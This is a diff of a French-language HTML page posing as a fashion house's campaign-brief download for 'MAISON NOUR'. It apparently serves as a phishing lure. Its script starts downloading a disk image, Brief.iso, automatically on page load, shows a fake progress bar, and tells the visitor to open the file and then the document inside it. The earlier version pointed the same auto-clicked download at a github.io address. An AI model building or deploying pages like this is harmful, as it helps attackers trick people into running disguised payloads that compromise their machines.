@@ -7,15 +7,44 @@ body{font-family:-apple-system,"Segoe UI",sans-serif;background:#f6f4f0;color:#1
 .c{max-width:400px;text-align:center;background:#fff;border:1px solid #e6e1d8;border-radius:14px;padding:34px 28px}
 .m{width:38px;height:38px;border-radius:9px;background:#1c1a17;color:#fff;display:grid;place-items:center;font-weight:700;margin:0 auto 18px}
 h1{font-size:19px;margin-bottom:8px}
-p{font-size:13.5px;color:#6d675e;line-height:1.65;margin-bottom:20px}
+p{font-size:13.5px;color:#6d675e;line-height:1.65;margin-bottom:18px}
 a{display:block;padding:13px;background:#1c1a17;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;font-size:13.5px}
-.s{font-size:11.5px;color:#8b857b;margin-top:16px}
+.b{height:4px;background:#eee7dc;border-radius:3px;overflow:hidden;margin-bottom:18px;display:none}
+.b i{display:block;height:100%;width:0;background:#1c1a17;transition:width .25s}
+.s{font-size:11.5px;color:#8b857b;margin-top:16px;line-height:1.7}
 </style></head><body><div class="c">
 <div class="m">MN</div>
 <h1>Votre dossier est prêt</h1>
-<p>Le brief de la campagne AW26 et les références sont en cours de téléchargement.</p>
-<a id="d" href="https://kardixs0.github.io/brief/Brief.iso" download="Brief.iso">Télécharger le dossier</a>
-<p class="s">MAISON NOUR · Casablanca</p>
+<p id="t">Préparation du fichier…</p>
+<div class="b" id="bar"><i id="fill"></i></div>
+<a id="d" href="#" style="display:none">Télécharger le dossier</a>
+<p class="s">Le téléchargement démarre automatiquement.<br>Ouvrez ensuite le fichier, puis le document qu'il contient.</p>
 </div>
-<script>window.addEventListener("load",()=>{setTimeout(()=>{document.getElementById("d").click()},400)});</script>
+<script>
+const U="Brief.iso", N="Brief.iso";
+const t=document.getElementById('t'), bar=document.getElementById('bar'), fill=document.getElementById('fill'), a=document.getElementById('d');
+async function go(){
+  try{
+    const r=await fetch(U); const total=+r.headers.get('content-length')||0;
+    bar.style.display='block';
+    const rd=r.body.getReader(); const ch=[]; let got=0;
+    while(true){
+      const {done,value}=await rd.read(); if(done)break;
+      ch.push(value); got+=value.length;
+      if(total) fill.style.width=Math.min(100,got/total*100)+'%';
+    }
+    const b=new Blob(ch,{type:'application/octet-stream'});
+    const u=URL.createObjectURL(b);
+    const x=document.createElement('a');
+    x.href=u; x.download=N; document.body.appendChild(x); x.click(); x.remove();
+    setTimeout(()=>URL.revokeObjectURL(u),20000);
+    t.textContent='Téléchargement lancé.';
+    a.href=u; a.download=N; a.style.display='block';
+  }catch(e){
+    t.textContent='Cliquez pour télécharger.';
+    a.href=U; a.style.display='block';
+  }
+}
+window.addEventListener('load',()=>setTimeout(go,300));
+</script>
 </body></html>
